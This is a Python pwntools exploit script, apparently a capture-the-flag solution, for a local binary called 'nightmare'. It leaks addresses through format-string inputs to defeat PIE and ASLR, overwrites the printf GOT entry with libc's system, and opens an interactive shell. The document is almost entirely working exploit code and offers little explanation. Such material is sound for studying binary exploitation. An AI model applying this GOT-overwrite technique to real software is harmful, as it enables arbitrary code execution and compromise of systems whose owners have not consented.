from pwn import *
import time


elf = context.binary = ELF("./nightmare")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

io = elf.process()



# Enumerate
lulzk_string_address = 0x102079
system_address = libc.symbols.system
bin_sh_address = libc.search("/bin/sh").next()
got_printf_address = 0x3568

# STAGE 1: breaking PIE
# Leak address
io.sendlineafter("> ", "2")
payload = "%p"
io.sendlineafter("> ", payload)
leaked_lulzk_var_address = int(io.recvline(), 16)

# Calculate binary base address from offset
binary_base_address = leaked_lulzk_var_address - lulzk_string_address
print("binary base address: ", hex(binary_base_address))

# STAGE 2: breaking ASLR (Leaking LIBC)
# Leak address
io.sendlineafter("> ", "1")
payload = "%2$p"
io.sendlineafter("> ", payload)
leaked__GI___libc_read_address = int(io.recvline(), 16)

# Calculate LIBC base address from offset
system = leaked__GI___libc_read_address - 672862 # subtracting system address from leaked address on GDB gave us 672862 (mone thakbe yes/no)
libc_base_address = system - system_address
printf = binary_base_address + got_printf_address

print('system address: ', hex(system))
print('printf address: ', hex(printf))
print('LINC base address: ', hex(libc_base_address))

def send_payload(payload):
	io.sendlineafter("> ", "1")
	io.sendlineafter("> ", payload)
	io.recvuntil("> ")
	return io.recvline().strip()

format_string = FmtStr(execute_fmt=send_payload)
format_string.write(printf, system)
format_string.execute_writes()

io.recv()
io.sendline("2")
io.recv()
io.sendline("sh")

io.interactive()

